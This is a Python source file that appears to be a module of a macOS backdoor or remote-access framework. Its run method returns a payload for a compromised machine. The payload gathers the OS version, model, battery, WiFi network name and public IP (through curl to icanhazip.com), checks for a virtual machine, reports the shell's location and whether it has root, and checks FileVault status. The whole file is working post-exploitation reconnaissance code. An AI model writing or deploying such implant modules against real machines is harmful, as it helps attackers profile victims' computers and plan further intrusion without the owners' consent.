class Module:
    """This module retrieves basic information about the client."""

    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Retrieves basic information about the client.",
            "References": [],
            "Task": False
        }

    def setup(self, module_view, output_view, successful):
        successful.put(True)

    def run(self):
        return """
        import platform
        
        
        def get_model():
            model_key = run_command("sysctl -n hw.model")
            
            if not model_key:
                model_key = "Macintosh"
                
            output = run_command("/usr/libexec/PlistBuddy -c 'Print :\\"%s\\"' /System/Library/PrivateFrameworks/ServerInformation.framework/Versions/A/Resources/English.lproj/SIMachineAttributes.plist | grep marketingModel" % model_key)
            
            if "does not exist" in output.lower():
                return model_key + " (running in virtual machine?)"
            else:
                return output.split("=")[1][1:]
        
        
        def get_wifi():
            command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep -w SSID"
            return run_command(command).split("SSID: ")[1]
        
        
        battery = run_command("pmset -g batt | egrep \\"([0-9]+\\%).*\\" -o | cut -f1 -d\';\'")
        
        print "System version: %s" % str(platform.mac_ver()[0])
        print "Model: %s" % get_model()
        print "Battery: %s" % battery
        print "WiFi network: %s (%s)" % (get_wifi(), run_command("curl -s https://icanhazip.com --connect-timeout 3"))
        print "Shell location: " + __file__
        
        if os.getuid() == 0:
            print "We are root!"
        else:
            print "We are not root."
        if "On" in run_command("fdesetup status"):
            print "FileVault is on."
        else:
            print "FileVault is off."
        """
